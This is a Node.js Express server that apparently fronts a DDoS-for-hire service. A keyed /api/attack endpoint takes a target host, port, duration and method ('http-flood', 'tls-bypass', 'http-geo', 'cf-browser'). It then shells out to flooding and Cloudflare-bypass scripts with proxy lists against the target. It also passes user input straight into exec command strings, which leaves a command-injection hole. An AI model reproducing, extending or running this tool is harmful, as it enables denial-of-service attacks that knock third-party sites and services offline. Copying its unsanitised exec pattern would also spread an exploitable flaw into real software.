const express = require("express");
const app = express();
const port = 3232;
var exec = require("child_process").exec;

app.get("/api/attack", (req, res) => {
  const clientIP =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP}`);
  if (!key || !host || !time || !method || !port) {
    const err_u = {
      status: `error`,
      message: `Server url API : /api/attack?key=bixd&host=<<$host>>&port=<<$port>>&method=<<$method>>&time=<<$time>>`,
    };
    return res.status(400).send(err_u);
  }

  if (key !== "bixd") {
    const err_key = {
      status: `error`,
      message: `Error Keys`,
    };
    return res.status(400).send(err_key);
  }

  if (time > 9999) {
    const err_time = {
      status: `error`,
      message: `Error Time < 60 Second`,
    };
    return res.status(400).send(err_time);
  }
  if (port > 65535 || port < 1) {
    const err_time = {
      status: `error`,
      message: `Error Port`,
    };
    return res.status(400).send(err_time);
  }

  if (
    !(
      method.toLowerCase() === "http-flood" ||
      method.toLowerCase() === "tls-bypass" ||
      method.toLowerCase() === "http-geo" ||
      method.toLowerCase() === "cf-browser"
    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      info: `t.me/cyberviet`,
    };
    return res.status(400).send(err_method);
  }

  const jsonData = {
    status: `success`,
    message: `Send Attack Successful`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
  };
  res.status(200).send(jsonData);
  if (method.toLowerCase() === "http-flood") {
    exec(
      `node reflood.js GET ${host} ${time} 5 90 output.txt --winter --http mix --delay 1`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [HTTPS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "tls-bypass") {
    exec(
      `node bypass.js GET ${host} ${time} 10 64 output.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "http-geo") {
    exec(
      `node bypass.js GET ${host} ${time} 10 64 vn.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "cf-browser") {
    exec(
      `node browser.js ${host} 10 output.txt 64 ${time}`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
});
app.listen(port, () => {
  console.log(`[API SERVER] running on http://localhost:${port}`);
});